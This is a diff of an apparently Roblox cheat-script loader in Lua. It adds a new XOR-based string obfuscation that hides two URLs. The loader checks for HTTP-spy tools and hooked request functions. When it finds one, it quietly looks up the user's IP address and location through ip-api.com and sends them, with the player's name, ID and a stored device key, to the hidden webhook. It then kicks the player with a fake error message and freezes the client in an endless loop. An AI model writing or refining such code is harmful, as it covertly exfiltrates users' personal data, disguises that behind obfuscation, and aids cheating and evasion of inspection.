@@ -1,15 +1,14 @@
-local function _0xDE(h, k)
-    local s = ""
-    for i = 1, #h, 2 do
-        local b = tonumber(h:sub(i, i+1), 16)
-        s = s .. string.char(bit32.bxor(b, k) - (i % 10))
+local function _0xDE(d, k)
+    local r = ""
+    for i = 1, #d do
+        r = r .. string.char(bit32.bxor(d[i] - i, k))
     end
-    return s
+    return r
 end
 
-local _0xK = 0x55
-local _AL = _0xDE("3D3E3F3C309E8E8FFEC4D3CECDD9D087CDD8D18C9D8681889D8FD590929F99989B94D1D4D7D2D6DDDED6D9DDCAD8DED0D9D994D0DBDC97DCDEDADEDAD7C9D696DEDCDFD7C9D6C99596D3C9DCDEDADEDAD7C9D6CDDCDFD7C9DBDFCDDCD19BCCDADFCD", _0xK)
-local _G1 = _0xDE("3D3E3F3C309E8E8FDFD085DED3DECD82DED2D6DECDC6D6D994DED8D6D9DDCAD8DE94D9CEC2DFD9D1D5CE97CFCFD1CEDAD7D6CF91DFD9D5CEDAD783DDC7DADF", _0xK)
+local _0xK = 0x3A
+local _AL = _0xDE({137, 150, 151, 148, 152, 96, 86, 87, 143, 141, 152, 137, 150, 154, 141, 88, 137, 150, 149, 84, 135, 151, 145, 87, 160, 143, 141, 148, 156, 157, 154, 163, 96, 99, 104, 101, 110, 106, 103, 113, 114, 107, 112, 109, 114, 118, 119, 117, 122, 121, 123, 124, 116, 185, 190, 124, 172, 191, 162, 188, 146, 123, 162, 130, 164, 168, 172, 156, 162, 144, 201, 137, 166, 173, 160, 178, 211, 191, 151, 184, 202, 174, 198, 169, 196, 203, 183, 204, 187, 151, 189, 227, 222, 230, 213, 199, 194, 171, 167, 215, 189, 198, 218, 219, 203, 237, 223, 172, 175, 208, 246, 227, 215, 219, 246, 203, 188, 189, 200, 239, 234}, _0xK)
+local _G1 = _0xDE({137, 150, 151, 148, 152, 96, 86, 87, 155, 139, 162, 90, 137, 140, 152, 141, 155, 137, 157, 156, 143, 157, 143, 156, 156, 163, 149, 159, 166, 97, 141, 152, 145, 157, 157, 154, 165, 166, 151, 165, 166, 151, 167, 156, 164, 162, 102, 164, 155, 163, 165, 110, 163, 168, 160}, _0xK)
 
 local _req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 local _L = game:GetService("Players").LocalPlayer
@@ -19,44 +18,39 @@ local function _SC()
     if not _req then return false end
     local ok, info = pcall(debug.getinfo, _req)
     if ok and info and (info.source ~= "=[C]" or info.what ~= "C") then return "HOOKED_REQUEST" end
-    if debug.getinfo(game.HttpGet).source ~= "=[C]" then return "HOOKED_HTTPGET" end
+    local ok2, info2 = pcall(debug.getinfo, game.HttpGet)
+    if ok2 and info2 and info2.source ~= "=[C]" then return "HOOKED_HTTPGET" end
     local cg = game:GetService("CoreGui")
-    for _, n in ipairs({"SimpleSpy", "HttpSpy", "HydroSpy", "VGG Spy", "TwiSpy", "NotDSF"}) do
-        if cg:FindFirstChild(n) or getgenv()[n] then return "SPY_FOUND_" .. n end
+    for _, n in ipairs({"SimpleSpy", "HttpSpy", "HydroSpy", "VGG Spy", "TwiSpy"}) do
+        if cg:FindFirstChild(n) or getgenv()[n] then return "SPY_" .. n end
     end
     return false
 end
 
-local _tk = "N/A"
-pcall(function()
-    if isfile and readfile and writefile then
-        if isfile("nazarkus_key.json") then _tk = readfile("nazarkus_key.json")
-        else _tk = _H:GenerateGUID(false) writefile("nazarkus_key.json", _tk) end
-    end
-end)
-
 local _se = _SC()
 if _se then
+    local tk = "N/A" pcall(function() tk = readfile("nazarkus_key.json") end)
     local ni = {} pcall(function() local r = _req({Url = "http://ip-api.com/json/", Method = "GET"}) if r.Success then ni = _H:JSONDecode(r.Body) end end)
     pcall(function()
         _req({
-            Url = _AL, Method = "POST", Headers = {["Content-Type"] = "application/json"},
+            Url = _AL, Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
             Body = _H:JSONEncode({
                 embeds = {{
-                    title = "Security Alert: Interceptor Detected",
+                    title = "Security Alert: Advanced Interceptor Detected",
                     color = 16711680,
                     fields = {
-                        {name = "Detection", value = tostring(_se), inline = false},
                         {name = "Player", value = _L.Name .. " (" .. _L.UserId .. ")", inline = true},
-                        {name = "Device Key", value = "```" .. _tk .. "```", inline = false},
-                        {name = "Network", value = string.format("IP: %s\nISP: %s\nLoc: %s, %s", ni.query or "N/A", ni.isp or "N/A", ni.country or "N/A", ni.city or "N/A"), inline = false}
+                        {name = "Device Key", value = "```" .. tk .. "```", inline = false},
+                        {name = "IP Info", value = ni.query or "N/A", inline = true},
+                        {name = "Loc", value = (ni.city or "N/A") .. ", " .. (ni.country or "N/A"), inline = true}
                     }
                 }}
             })
         })
     end)
-    _L:Kick("Security Tamper Detected. Session Blocked.")
-    return
+    _L:Kick("Loader Error: 0xSECURITY")
+    while true do end return
 end
 
 local _TS = game:GetService("TestService")
